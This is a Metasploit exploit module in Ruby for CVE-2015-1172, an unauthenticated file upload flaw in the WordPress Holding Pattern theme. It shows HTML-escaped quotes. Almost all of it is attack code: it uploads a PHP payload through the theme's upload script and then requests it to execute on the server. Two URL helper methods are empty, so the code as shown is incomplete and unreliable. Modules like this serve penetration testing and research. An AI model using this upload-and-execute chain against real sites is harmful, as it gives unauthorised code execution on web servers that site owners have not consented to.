# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
require &#039;socket&#039;
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::FileDropper
def initialize(info = {})
super(update_info(
info,
&#039;Name&#039; => &#039;WordPress Holding Pattern Theme Arbitrary File Upload&#039;,
&#039;Description&#039; => %q{
This module exploits a file upload vulnerability in all versions of the
Holding Pattern theme found in the upload_file.php script which contains
no session or file validation. It allows unauthenticated users to upload
files of any type and subsequently execute PHP scripts in the context of
the web server.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;Alexander Borg&#039;, # Vulnerability disclosure
&#039;Rob Carr <rob[at]rastating.com>&#039; # Metasploit module
],
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2015-1172&#039;],
[&#039;WPVDB&#039;, &#039;7784&#039;],
[&#039;URL&#039;, &#039;http://packetstormsecurity.com/files/130282/WordPress-Holding-Pattern-0.6-Shell-Upload.html&#039;]
],
&#039;DisclosureDate&#039; => &#039;Feb 11 2015&#039;,
&#039;Platform&#039; => &#039;php&#039;,
&#039;Arch&#039; => ARCH_PHP,
&#039;Targets&#039; => [[&#039;holding_pattern&#039;, {}]],
&#039;DefaultTarget&#039; => 0
))
end
def rhost
datastore[&#039;RHOST&#039;]
end
def holding_pattern_uploads_url
end
def holding_pattern_uploader_url
end
def generate_mime_message(payload, payload_name)
data = Rex::MIME::Message.new
target_ip = IPSocket.getaddress(rhost)
field_name = Rex::Text.md5(target_ip)
data.add_part(payload.encoded, &#039;application/x-php&#039;, nil, "form-data; name=\"#{field_name}\"; filename=\"#{payload_name}\"")
data
end
def exploit
print_status("#{peer} - Preparing payload...")
payload_name = "#{Rex::Text.rand_text_alpha(10)}.php"
data = generate_mime_message(payload, payload_name)
print_status("#{peer} - Uploading payload...")
res = send_request_cgi(
&#039;method&#039; => &#039;POST&#039;,
&#039;uri&#039; => holding_pattern_uploader_url,
&#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
&#039;data&#039; => data.to_s
)
fail_with(Failure::Unreachable, &#039;No response from the target&#039;) if res.nil?
fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200
payload_url = normalize_uri(holding_pattern_uploads_url, payload_name)
print_status("#{peer} - Executing the payload at #{payload_url}")
register_files_for_cleanup(payload_name)
send_request_cgi({ &#039;uri&#039; => payload_url, &#039;method&#039; => &#039;GET&#039; }, 5)
end
end

